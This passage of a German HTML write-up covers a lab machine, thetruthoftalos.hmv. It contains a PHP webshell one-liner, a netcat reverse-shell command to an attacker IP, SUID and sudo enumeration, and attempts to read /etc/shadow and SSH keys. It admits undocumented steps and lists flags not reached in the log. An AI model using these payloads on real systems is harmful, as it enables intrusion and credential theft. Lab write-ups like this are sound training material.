+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool newjerusalem.jpg</span></div>
+                     <pre>[...] <span class="password">Keine auffälligen Metadaten</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings newjerusalem.jpg -n 7</span></div>
+                     <pre>[...] <span class="password">Keine offensichtlichen Klartext-Passwörter/Flags</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf newjerusalem.jpg</span></div>
+                     <pre>Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C newjerusalem.jpg</span></div>
+                     <pre>s</pre> <span class="password"><-- Nur ein 's' gefunden? Unwahrscheinlich relevant.</span>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">binwalk newjerusalem.jpg</span></div>
+                     <pre>
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, EXIF standard
+12            0xC             TIFF image data, little-endian offset of first image directory: 8
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Bilddatei `newjerusalem.jpg` wird vom VHost heruntergeladen. Verschiedene Steganographie-Tools (`exiftool`, `strings`, `steghide`, `stegsnow`, `binwalk`) werden angewendet, um versteckte Informationen zu finden. Keines der Tools liefert signifikante Ergebnisse; `steghide` benötigt ein Passwort, `stegsnow` findet nur ein 's', `binwalk` zeigt nur Standard-JPEG/TIFF-Strukturen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Bilddatei scheint keine versteckten Daten zu enthalten, die mit diesen gängigen Tools extrahiert werden können. Dies war wahrscheinlich eine falsche Fährte oder erfordert ein spezifisches Passwort für `steghide`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich wieder auf die `index.php` und die Möglichkeit der Command Injection oder einen anderen Weg, Code auszuführen (z.B. File Upload, falls das `/uploads`-Verzeichnis beschreibbar ist).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://thetruthoftalos.hmv/uploads/ben.php?cmd=id</span></div>
+                     <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Plötzlich wird `curl` verwendet, um auf eine Datei `/uploads/ben.php` auf dem VHost zuzugreifen und den Parameter `cmd=id` zu übergeben. Die Antwort zeigt die Ausgabe des `id`-Befehls, ausgeführt als `www-data`. **Wichtiger Hinweis:** Das Log dokumentiert nicht, wie die Datei `ben.php` in das `/uploads`-Verzeichnis gelangt ist. Es muss angenommen werden, dass zuvor ein erfolgreicher Upload einer Webshell (vermutlich mit dem Inhalt `system($GET['cmd']);`) stattgefunden hat, möglicherweise durch Ausnutzung einer nicht gezeigten Schwachstelle in `index.php` oder einer anderen Methode.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution (RCE) als Benutzer `www-data` ist bestätigt. Obwohl der Upload-Schritt fehlt, ist das Ergebnis klar: Es gibt eine funktionierende Webshell im `/uploads`-Verzeichnis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Webshell (`ben.php`), um eine stabilere Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie, wie die Datei `ben.php` hochgeladen werden konnte. Schließen Sie die entsprechende Lücke (wahrscheinlich in `index.php` oder einer Upload-Funktion). Entfernen Sie die Webshell. Sichern Sie das `/uploads`-Verzeichnis ab.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: Remote Code Execution via Webshell Upload</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Obwohl der genaue Mechanismus im Log nicht dokumentiert ist, wurde eine PHP-Webshell (`ben.php`) erfolgreich in das `/uploads/`-Verzeichnis der Webanwendung auf `http://thetruthoftalos.hmv` hochgeladen. Dies deutet auf eine Schwachstelle hin, die es einem Angreifer ermöglicht, beliebige Dateien hochzuladen und im Web-Root abzulegen (z.B. eine unzureichende Upload-Validierung in `index.php` oder einer anderen Komponente). Die hochgeladene Webshell (`ben.php`) enthält typischerweise Code wie `system($GET['cmd']);`, der es erlaubt, über den `cmd`-Parameter in der URL beliebige Betriebssystembefehle auszuführen.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                     <li>Netzwerkzugriff auf den VHost `thetruthoftalos.hmv`.</li>
+                     <li>Eine Schwachstelle, die das Hochladen von PHP-Dateien in ein webzugängliches Verzeichnis (hier `/uploads/`) ermöglicht.</li>
+                     <li>Kenntnis des Pfads zur hochgeladenen Webshell (`/uploads/ben.php`).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>
+                         <strong>Webshell hochladen (Implizierter Schritt):</strong>
+                         Laden Sie eine PHP-Datei (z.B. `ben.php`) mit folgendem Inhalt über die (nicht dokumentierte) Schwachstelle in das `/uploads/`-Verzeichnis hoch:
+                         <div class="code-block">
+                             <pre>system($GET['cmd']);</pre>
+                             *(Hinweis: Im tatsächlichen Payload müssen `<?php` und `?>`-Tags vorhanden sein).*
+                        </div>
+                    </li>
+                     <li>
+                         <strong>Befehlsausführung testen:</strong>
+                         Rufen Sie die URL der Webshell auf und fügen Sie den `cmd`-Parameter hinzu, um einen Befehl auszuführen:
+                         <div class="code-block">
+                            <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://thetruthoftalos.hmv/uploads/ben.php?cmd=id"</span></div>
+                                 <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <strong>Reverse Shell (Optional, aber empfohlen):</strong>
+                        Starten Sie einen Netcat-Listener auf dem Angreifer-System:
+                         <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                                 <pre>listening on [any] 4444 ...</pre>
+                             </div>
+                         </div>
+                        Rufen Sie die Webshell mit einem Reverse-Shell-Payload auf:
+                        <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://thetruthoftalos.hmv/uploads/ben.php?cmd=nc%20-e%20/bin/bash%20192.168.2.199%204444"</span></div>
+                                 <pre>[Keine Ausgabe von curl erwartet]</pre>
+                             </div>
+                         </div>
+                         Im Listener sollte eine Verbindung eingehen:
+                        <div class="code-block">
+                             <div class="terminal">
+                                <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.131] 41386</span>
+<span class="prompt">www-data@principle2:/path/to/uploads$</span> <span class="password"># Shell erhalten</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Fähigkeit, beliebige Betriebssystembefehle als Benutzer `www-data` auszuführen, und optional der Erhalt einer interaktiven Reverse Shell.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche Ausgabe des `id`-Befehls und/oder die eingehende Verbindung im Netcat-Listener.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Eine funktionierende Webshell bedeutet vollständige Kompromittierung der Webanwendung und des ausführenden Benutzers (`www-data`). Dies ermöglicht Datendiebstahl, weitere Angriffe und potenziell die Eskalation von Rechten.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**Upload-Schwachstelle finden und beheben:** Identifizieren Sie die Lücke, die den Upload von `ben.php` ermöglichte (unzureichende Validierung, Konfigurationsfehler) und schließen Sie sie.</li>
+                     <li>**Webshell entfernen:** Löschen Sie die Datei `/uploads/ben.php` und alle anderen verdächtigen Dateien.</li>
+                     <li>**Uploads absichern:** Implementieren Sie strikte serverseitige Validierung für Dateiuploads (Whitelist für Endungen, Inhaltsprüfung, zufällige Namen, Speicherung außerhalb des Web-Roots).</li>
+                     <li>**Berechtigungen prüfen:** Stellen Sie sicher, dass der Webserver-Benutzer keine unnötigen Schreibrechte hat.</li>
+                     <li>**Web Application Firewall (WAF):** Kann helfen, Uploads von Webshells zu erkennen/blockieren.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Fortsetzung: Reverse Shell)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Aufruf der Webshell mit Reverse-Shell Payload (impliziert durch nächsten Schritt)</span></div>
+                     <pre>http://thetruthoftalos.hmv/uploads/ben.php?cmd=nc%20-e%20/bin/bash%20192.168.2.199%204444</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Eingehende Verbindung im Listener</span></div>
+                     <div class="terminal"> <span class="password"><-- Format leicht angepasst</span>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.131] 41386</span>
+</pre>
+                     <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="password"># Shell erhalten</span></div>
+                    </div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4444 des Angreifer-Systems gestartet. Anschließend wird die Webshell `ben.php` mit einem Payload aufgerufen, der `nc` verwendet, um eine Reverse Shell (`/bin/bash`) zurück zum Listener zu starten. Der Listener empfängt erfolgreich die Verbindung, und der Angreifer erhält eine Shell als Benutzer `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich etabliert und stabilisiert durch eine interaktive Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell ggf. weiter stabilisieren (Python PTY). Mit der Enumeration als `www-data` beginnen, um Wege zur Privilege Escalation zu finden (`sudo -l`, SUID-Dateien, Cronjobs etc.).<br><strong>Empfehlung (Admin):</strong> Webshell entfernen, Upload-Lücke schließen. Ausgehende Firewall-Regeln prüfen, um Reverse Shells zu erschweren.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   656534     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+   657131     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+   656536     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+   652918     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+   <span class="command">686123     16 -rwsr-x---   1 root     melville    16232 Nov 26 11:38 /usr/bin/updater</span> <span class="password"><-- Interessant!</span>
+   686178    276 -rwsr-xr-x   1 root     root       281624 Jun 27 12:45 /usr/bin/sudo
+   656380     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+   652922     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+   652921     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+   652919     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+   681553    128 -rwsr-xr-x   1 root     root       130056 Jan 11  2023 /usr/sbin/mount.nfs
+   661544     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16 11:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   670860    640 -rwsr-xr-x   1 root     root         653888 Sep 23 23:11 /usr/lib/openssh/ssh-keysign
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Dateien (`find / -perm -4000 ...`) listet verschiedene Standard-Binaries auf. Besonders auffällig ist jedoch `<span class="command">/usr/bin/updater</span>`. Diese Datei gehört `root`, hat das SUID-Bit gesetzt (`-rwsr-x---`), aber die Gruppenzugehörigkeit ist `melville` und die Ausführungsrechte für "andere" fehlen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `/usr/bin/updater` ist ein starker Kandidat für Privilege Escalation. Da es SUID Root ist, wird es mit Root-Rechten ausgeführt. Die eingeschränkten Ausführungsrechte (`---` für andere) bedeuten, dass nur `root` und Mitglieder der Gruppe `melville` es direkt ausführen können. Der Benutzer `www-data` kann es nicht direkt starten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Datei `/usr/bin/updater` genauer (z.B. mit `strings`, `ltrace`, `strace`, Disassembler), um ihre Funktion zu verstehen und potenzielle Schwachstellen (z.B. Command Injection, unsichere Pfadverwendung) zu finden. Da `www-data` es nicht ausführen kann, muss entweder ein Weg gefunden werden, zur Gruppe `melville` zu wechseln, oder eine Schwachstelle im Skript gefunden werden, die indirekt ausgenutzt werden kann. Prüfen Sie `sudo -l` für `www-data`.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit des `/usr/bin/updater`-Skripts. Wenn es SUID Root sein muss, stellen Sie sicher, dass es sicher implementiert ist und keine Schwachstellen enthält. Die Berechtigungen (`rwsr-x---`) sind ungewöhnlich und sollten überprüft werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="command">ss -altpn</span></div>
+                    <pre>[...] <span class="password"># Ausgabe zeigt diverse lauschende Ports, bestätigt vorherige Nmap-Ergebnisse</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -altpn` listet die aktiven lauschenden TCP-Ports auf dem System auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die von Nmap gefundenen offenen Ports (80, 111, 139, 445, 2049 und diverse hohe RPC-Ports). Liefert keine neuen Informationen für die Eskalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine direkte Aktion erforderlich.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Ports lauschen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on principle2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User www-data may run the following commands on principle2:
+    <span class="command">(talos) NOPASSWD: /usr/bin/cat</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt die `sudo`-Berechtigungen für den Benutzer `www-data`. Es stellt sich heraus, dass `www-data` den Befehl `/usr/bin/cat` als Benutzer `<span class="command">talos</span>` ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein signifikanter Privilege Escalation Vektor! Obwohl es nicht direkt zu Root führt, ermöglicht es `www-data`, beliebige Dateien zu lesen, auf die der Benutzer `talos` Lesezugriff hat. Dies kann genutzt werden, um sensible Informationen wie SSH-Schlüssel oder Passwörter von `talos` zu lesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Berechtigung, um potenziell sensible Dateien im Home-Verzeichnis von `talos` zu lesen, insbesondere im `.ssh`-Verzeichnis (`sudo -u talos /usr/bin/cat /home/talos/.ssh/id_rsa`, `sudo -u talos /usr/bin/cat /home/talos/.bash_history`, etc.) oder Konfigurationsdateien, auf die `talos` Zugriff hat.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie diese `sudo`-Regel dringend. Das Ausführen von `cat` als anderer Benutzer ist gefährlich, da es den Lesezugriff auf alle Dateien dieses Benutzers ermöglicht. Ersetzen Sie dies durch spezifischere, sicherere Mechanismen, falls eine solche Funktionalität benötigt wird.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="command">sudo -u talos /usr/bin/cat /etc/shadow</span></div>
+                     <pre>/usr/bin/cat: /etc/shadow: <span class="password">Permission denied</span></pre>
+                     <div class="prompt">www-data@principle2:~/thetruthoftalos.hmv/uploads$ <span class="command">sudo -u talos /usr/bin/cat /home/talos/*</span></div>
+                     <pre>/usr/bin/cat: '/home/talos/*': <span class="password">No such file or directory</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es werden zwei Versuche unternommen, die `sudo`-Regel zu nutzen:
+            1.  `sudo -u talos /usr/bin/cat /etc/shadow`: Fehlschlag, da der Benutzer `talos` selbst keine Leserechte auf `/etc/shadow` hat (gehört `root`, Gruppe `shadow`).
+            2.  `sudo -u talos /usr/bin/cat /home/talos/*`: Fehlschlag, da die Shell das Wildcard `*` expandiert, bevor `sudo` ausgeführt wird, und `www-data` wahrscheinlich keine Leserechte auf alle Dateien in `/home/talos` hat, oder das Wildcard von `cat` nicht korrekt interpretiert wird. Es hätte ein spezifischer Dateiname angegeben werden müssen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `sudo`-Regel wurde nicht optimal genutzt. Es wurde versäumt, spezifische, potenziell lesbare Dateien im Kontext von `talos` anzuvisieren (z.B. `id_rsa`). Die Protokollierung endet hier, bevor eine erfolgreiche Eskalation über diesen Weg gezeigt wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den `sudo`-Befehl korrekt, um spezifische Dateien zu lesen, auf die `talos` Zugriff hat, z.B.: `sudo -u talos /usr/bin/cat /home/talos/.ssh/id_rsa`. Wenn dies erfolgreich ist, verwenden Sie den Schlüssel, um sich als `talos` per SSH anzumelden und nach weiteren Eskalationsmöglichkeiten zu suchen (z.B. mit dem SUID-`updater`).<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel korrigieren.</p>
+            <p class="evaluation">**Abschließende Bewertung des Logs:** Das Log dokumentiert erfolgreich den Initial Access als `www-data` über eine (implizierte) Webshell-Upload-Schwachstelle. Es identifiziert korrekt einen vielversprechenden Privilege Escalation Vektor (`sudo -u talos cat`), aber die weitere Ausnutzung dieses Vektors oder des SUID-`updater`-Binaries wird nicht gezeigt. Die am Ende aufgelisteten Flags scheinen daher nicht durch die im Log dokumentierten Schritte erreichbar gewesen zu sein.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. Dezember 2023</p> <!-- Korrektes Datum aus Nikto extrahiert -->
+    </footer>
+</body>
+</html>
